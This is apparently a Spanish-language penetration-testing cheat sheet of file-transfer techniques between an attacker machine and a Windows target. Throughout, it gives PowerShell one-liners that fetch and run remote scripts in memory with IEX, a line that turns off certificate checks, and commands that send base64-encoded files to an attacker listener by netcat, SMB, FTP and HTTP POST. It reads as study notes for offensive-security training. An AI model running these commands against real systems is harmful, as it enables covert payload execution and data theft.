

## ==Download Methods==
## Base64

Lo que podemos hace res pasar a base64 el archivo y decodearlo en la maquina windows. 

*Atacante:*
```
cat file | base64 -w 0
```

*Windows:*

```
[IO.File]::WriteAllBytes("C:\file", [Convert]::FromBase64String("STRING"))
```

Pero tiene un límite de 8191 caracteres, asi que en archivos grandes no se puede. 

## PowerShell Web Download

Hay 3 opciones para descargar algo por HTTP:

### DownloadFile Method

```
(New-Object Net.WebClient).DownloadFile("http://IP/file.exe","C:\file.exe")
```

### Fileless Method

```
IEX (New-Object Net.WebClient).DownloadString("http://IP/script.ps1")
```

Esto se ejecuta en memoria y no se guarda archivo en el disco

### Invoke-WebRequest

```
 Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

si da error de certificado SSL usamos esta linea:

```
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

## SMB Download 

*Atacante:*

```
impacket-smbserver share /tmp
```

en la maquina *windows*:

```
copy \\IP\share\file.exe
```


si hay bloqueo de acceso anónimo:

*Atacante:*

```
impacket-smbserver share /tmp -user test -password test
```

*Windows:*

```
net use n: \\IP\share /user:test test
copy n:\file.exe
```

## FTP Download

*Atacante:*

```
python3 -m pyftpdlib --port 21
```

*Windows:*

```
(New-Object Net.WebClient).DownloadFile("ftp://IP/file.txt","C:\file.txt")
```


# ==Upload Methods==

## Base64

Codificamos el archivo en Windows y lo decodificamos en nuestra máquina.

_Windows:_

```
[Convert]::ToBase64String((Get-Content "C:\file" -Encoding byte))
```

_Atacante:_

```
echo STRING | base64 -d > file
```

---

## HTTP Upload (PowerShell)

Necesitamos un servidor que acepte uploads.

_Atacante:_

```
python3 -m uploadserver
```

_Windows:_

```
Invoke-FileUpload -Uri http://IP:8000/upload -File C:\file
```

---

## Netcat + POST

Enviar archivo en base64 por POST.

_Atacante:_

```
nc -lvnp 8000
```

_Windows:_

```
$b64 = [System.Convert]::ToBase64String((Get-Content C:\file -Encoding Byte)) Invoke-WebRequest -Uri http://IP:8000 -Method POST -Body $b64
```

---

## SMB Upload

Si 445 está abierto:

_Windows:_

```
copy C:\file \\IP\share\
```

---

## FTP Upload

_Atacante:_

```
python3 -m pyftpdlib --port 21 --write
```

_Windows:_

```
(New-Object Net.WebClient).UploadFile("ftp://IP/file","C:\file")
```

